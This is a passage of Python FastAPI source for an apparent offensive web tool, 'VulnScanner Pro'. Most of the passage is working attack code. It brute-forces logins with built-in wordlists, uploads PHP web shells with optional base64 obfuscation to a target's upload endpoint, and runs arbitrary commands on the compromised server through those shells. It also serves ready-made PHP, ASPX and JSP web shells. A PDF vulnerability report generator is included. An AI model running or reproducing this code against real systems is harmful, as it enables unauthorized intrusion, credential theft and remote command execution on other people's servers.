            return {"status":r.status_code,"headers":dict(r.headers),"body":r.text[:5000],"length":len(r.text),"reflected":req.payload in r.text,"encoding":r.encoding}
    except Exception as e:
        raise HTTPException(500, str(e))

@app.post("/api/bruteforce")
async def run_bruteforce(req: BruteRequest):
    users = req.usernames or BUILT_IN_WORDLISTS["users"]
    passwords = req.passwords or wordlists.get("passwords", BUILT_IN_WORDLISTS["passwords"])
    found = []
    login_url = req.target.rstrip("/")+req.path
    async with httpx.AsyncClient(timeout=10,verify=False,follow_redirects=False) as client:
        for user in users:
            for pwd in passwords:
                try:
                    r = await client.post(login_url, data={req.user_field:user,req.pass_field:pwd})
                    body_l = r.text.lower()
                    if any(s in body_l for s in ["dashboard","welcome","logout","account"]) and r.status_code in (200,302):
                        found.append({"username":user,"password":pwd,"status":r.status_code})
                    await asyncio.sleep(0.05)
                except: pass
    return {"target":login_url,"tried":len(users)*len(passwords),"found":found}

@app.post("/api/wordlist")
def save_wordlist(req: CustomWordlistRequest):
    wordlists[req.name] = req.words
    return {"saved": req.name, "count": len(req.words)}

@app.post("/api/wordlist/upload")
async def upload_wordlist(name: str, file: UploadFile = File(...)):
    content = await file.read()
    words = [w.strip() for w in content.decode("utf-8","ignore").splitlines() if w.strip()]
    wordlists[name] = words
    return {"saved": name, "count": len(words)}

@app.get("/api/wordlists")
def list_wordlists():
    return {k: len(v) for k, v in wordlists.items()}

@app.post("/api/shell/deploy")
async def deploy_shell(req: ShellDeployRequest):
    shells = {
        "php": b"<?php system($_GET['c']); ?>",
        "php_obf": b"<?php $f=base64_decode('c3lzdGVt');$f($_GET['c']); ?>",
    }
    code = shells.get(req.shell_type, shells["php"])
    if req.obfuscate:
        encoded = base64.b64encode(code).decode()
        code = f"<?php eval(base64_decode('{encoded}')); ?>".encode()
    try:
        files = {req.upload_param: ("shell.php", io.BytesIO(code), "application/octet-stream")}
        async with httpx.AsyncClient(timeout=15,verify=False) as client:
            r = await client.post(req.target.rstrip("/")+req.upload_endpoint, files=files)
            shell_url = req.target.rstrip("/")+"/uploads/shell.php"
            probe = await client.get(shell_url, params={"c":"id"})
            if "uid=" in probe.text:
                session_id = "SES-"+str(uuid.uuid4())[:6].upper()
                sessions[session_id] = {"id":session_id,"target":req.target,"shell_url":shell_url,"shell_type":req.shell_type.upper()+" Shell","priv":probe.text.strip()[:60],"created_at":datetime.utcnow().isoformat()}
                return {"success":True,"shell_url":shell_url,"session_id":session_id,"output":probe.text[:300]}
            return {"success":False,"upload_status":r.status_code,"detail":"Shell dropped but not executable at expected path"}
    except Exception as e:
        raise HTTPException(500, str(e))

@app.get("/api/sessions")
def list_sessions():
    return list(sessions.values())

@app.get("/api/sessions/{session_id}/exec")
async def exec_shell(session_id: str, cmd: str = "id"):
    if session_id not in sessions: raise HTTPException(404,"Session not found")
    sess = sessions[session_id]
    shell_url = sess.get("shell_url")
    if not shell_url: raise HTTPException(400,"No shell URL")
    try:
        async with httpx.AsyncClient(timeout=15,verify=False) as client:
            r = await client.get(shell_url, params={"c": cmd})
            return {"cmd":cmd,"output":r.text[:4000],"status":r.status_code}
    except Exception as e:
        raise HTTPException(500, str(e))

@app.delete("/api/sessions/{session_id}")
def kill_session(session_id: str):
    if session_id not in sessions: raise HTTPException(404,"Not found")
    del sessions[session_id]
    return {"killed": session_id}

@app.get("/api/report/{scan_id}")
def get_report_json(scan_id: str):
    if scan_id not in scans: raise HTTPException(404,"Not found")
    return scans[scan_id]

@app.get("/api/report/{scan_id}/pdf")
def get_report_pdf(scan_id: str):
    if scan_id not in scans: raise HTTPException(404,"Not found")
    if not PDF_OK: raise HTTPException(501,"reportlab not installed — run: pip install reportlab")
    scan = scans[scan_id]
    buf = io.BytesIO()
    doc = SimpleDocTemplate(buf, pagesize=A4, rightMargin=30, leftMargin=30, topMargin=30, bottomMargin=30)
    styles = getSampleStyleSheet()
    story = []
    story.append(Paragraph("VulnScanner Pro — Vulnerability Report", styles["Title"]))
    story.append(Spacer(1,12))
    story.append(Paragraph(f"Target: {scan['target']}", styles["Normal"]))
    story.append(Paragraph(f"Scan ID: {scan_id}", styles["Normal"]))
    story.append(Paragraph(f"Date: {scan.get('started_at','N/A')}", styles["Normal"]))
    story.append(Paragraph(f"WAF: {scan.get('waf','None detected')}", styles["Normal"]))
    story.append(Spacer(1,20))
    story.append(Paragraph("Findings", styles["Heading2"]))
    vuln_data = [["Severity","Name","Endpoint","Type"]]
    sev_colors = {"critical": rl_colors.red, "high": rl_colors.orange, "medium": rl_colors.yellow, "low": rl_colors.green}
    for v in scan["vulns"]:
        vuln_data.append([v.get("severity","?").upper(), v.get("name","?")[:50], v.get("endpoint","?")[:40], v.get("type","?")])
    if len(vuln_data) > 1:
        t = Table(vuln_data, colWidths=[70,200,160,70])
        style = TableStyle([
            ("BACKGROUND",(0,0),(-1,0),rl_colors.HexColor("#21262d")),
            ("TEXTCOLOR",(0,0),(-1,0),rl_colors.white),
            ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"),
            ("FONTSIZE",(0,0),(-1,-1),9),
            ("ROWBACKGROUNDS",(0,1),(-1,-1),[rl_colors.HexColor("#f8f8f8"),rl_colors.white]),
            ("GRID",(0,0),(-1,-1),0.5,rl_colors.HexColor("#dddddd")),
            ("LEFTPADDING",(0,0),(-1,-1),6),
            ("RIGHTPADDING",(0,0),(-1,-1),6),
        ])
        t.setStyle(style)
        story.append(t)
    else:
        story.append(Paragraph("No vulnerabilities found.", styles["Normal"]))
    story.append(Spacer(1,20))
    story.append(Paragraph("Scan Log (last 50 entries)", styles["Heading2"]))
    for entry in scan["log"][-50:]:
        story.append(Paragraph(f"[{entry.get('time','')}] [{entry.get('tag','')}] {entry.get('msg','')[:120]}", styles["Code"]))
    doc.build(story)
    pdf_bytes = buf.getvalue()
    return Response(content=pdf_bytes, media_type="application/pdf", headers={"Content-Disposition":f"attachment; filename=vulnscan-{scan_id[:8]}.pdf"})

@app.get("/api/shells/{shell_type}")
def get_shell_code(shell_type: str, obfuscate: bool = False):
    shells = {
        "php":     "<?php system($_GET['c']); ?>",
        "php_adv": '<?php\n$c=@$_REQUEST["c"];\nif($c){\n  $d=popen($c,"r");\n  $o="";\n  while(!feof($d)){$o.=fgets($d,512);}\n  pclose($d);\n  echo"<pre>".htmlspecialchars($o)."</pre>";\n}\n?><form><input name="c" size="60"><input type="submit"></form>',
        "aspx":    '<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<% string c=Request["c"];\nif(c!=null){var p=new Process();p.StartInfo.FileName="cmd";p.StartInfo.Arguments="/c "+c;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");} %>\n<form><input name="c" size="60"><input type="submit"></form>',
        "jsp":     '<%@page import="java.io.*"%>\n<%String c=request.getParameter("c");\nif(c!=null){String[]args={"/bin/sh","-c",c};\nProcess p=Runtime.getRuntime().exec(args);\nInputStream in=p.getInputStream();\nint b;out.print("<pre>");\nwhile((b=in.read())!=-1)out.write(b);\nout.print("</pre>");}\n%>\n<form><input name="c" size="60"><input type="submit"></form>',
    }
    if shell_type not in shells: raise HTTPException(404,"Shell type not found")
    code = shells[shell_type]
    if obfuscate:
        b64 = base64.b64encode(code.encode()).decode()
        code = f"<?php eval(base64_decode('{b64}')); ?>"
    return {"type":shell_type,"code":code,"obfuscated":obfuscate}
